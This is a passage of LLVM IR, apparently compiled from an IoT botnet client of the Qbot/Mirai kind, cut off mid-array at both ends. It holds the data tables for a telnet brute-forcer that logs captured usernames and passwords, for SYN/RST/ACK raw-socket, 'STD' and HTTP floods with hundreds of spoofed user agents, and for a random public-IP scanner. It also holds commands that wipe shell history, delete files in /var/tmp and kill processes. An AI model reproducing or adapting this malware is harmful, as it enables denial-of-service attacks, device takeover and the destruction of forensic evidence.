-1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.132 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.133 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.135 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GetRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.136 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.137 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [99 x i8] c"\1B[0;36mHUMAN ATTEMPT | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@.str.139 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.140 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.141 = private unnamed_addr constant [96 x i8] c"\1B[0;36mHUMAN SENT | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@.str.142 = private unnamed_addr constant [98 x i8] c"\1B[0;36mHUMAN FAILED | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@.str.143 = private unnamed_addr constant [99 x i8] c"\1B[0;36mHUMAN SUCCESS | IP: \1B[0;37m%s \1B[0;36m| Username: \1B[0;37m%s \1B[0;36m| Password: \1B[0;37m%s\1B[0m\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.179, i32 0, i32 0)], align 16
@.str.144 = private unnamed_addr constant [6 x i8] c"arfgG\00", align 1
@.str.145 = private unnamed_addr constant [9 x i8] c"HBiug655\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"KJYDFyljf754\00", align 1
@.str.147 = private unnamed_addr constant [20 x i8] c"LIKUGilkut769458905\00", align 1
@.str.148 = private unnamed_addr constant [17 x i8] c"JHFDSkgfc5747694\00", align 1
@.str.149 = private unnamed_addr constant [12 x i8] c"GJjyur67458\00", align 1
@.str.150 = private unnamed_addr constant [12 x i8] c"RYSDk747586\00", align 1
@.str.151 = private unnamed_addr constant [12 x i8] c"HKJGi5r8675\00", align 1
@.str.152 = private unnamed_addr constant [10 x i8] c"KHGK7985i\00", align 1
@.str.153 = private unnamed_addr constant [11 x i8] c"yuituiILYF\00", align 1
@.str.154 = private unnamed_addr constant [14 x i8] c"GKJDghfcjkgd4\00", align 1
@.str.155 = private unnamed_addr constant [12 x i8] c"uygtfgtrevf\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"tyeuhygbtfvg\00", align 1
@.str.157 = private unnamed_addr constant [9 x i8] c"ewqdcftr\00", align 1
@.str.158 = private unnamed_addr constant [16 x i8] c"trbazetghhnbrty\00", align 1
@.str.159 = private unnamed_addr constant [11 x i8] c"tbhrwsehbg\00", align 1
@.str.160 = private unnamed_addr constant [12 x i8] c"twehgbferhb\00", align 1
@.str.161 = private unnamed_addr constant [12 x i8] c"etrbhhgetrb\00", align 1
@.str.162 = private unnamed_addr constant [14 x i8] c"edfverthbyrtb\00", align 1
@.str.163 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.164 = private unnamed_addr constant [14 x i8] c"zcdbvgdfsbgfd\00", align 1
@.str.165 = private unnamed_addr constant [10 x i8] c"gdfbtsdgb\00", align 1
@.str.166 = private unnamed_addr constant [14 x i8] c"ghdugffytsdyt\00", align 1
@.str.167 = private unnamed_addr constant [14 x i8] c"tgerthgwtrwry\00", align 1
@.str.168 = private unnamed_addr constant [12 x i8] c"yteytietyue\00", align 1
@.str.169 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.170 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.171 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.172 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.173 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.174 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.175 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.176 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.177 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.178 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.179 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.180 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.181 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.182 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.183 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.184 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.185 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.186 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.187 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.188 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.189 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.190 = private unnamed_addr constant [10 x i8] c"pkill -9 \00", align 1
@.str.191 = private unnamed_addr constant [11 x i8] c"pkill -9 \22\00", align 1
@.str.192 = private unnamed_addr constant [2 x i8] c"\22\00", align 1
@.str.193 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.194 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@.str.195 = private unnamed_addr constant [21 x i8] c"cd /var/tmp; rm -f *\00", align 1
@sendHTTP.useragents = private unnamed_addr constant [649 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.302, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.303, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.306, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.307, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.308, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.313, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([160 x i8], [160 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([133 x i8], [133 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([130 x i8], [130 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.209, i32 0, i32 0), i8* 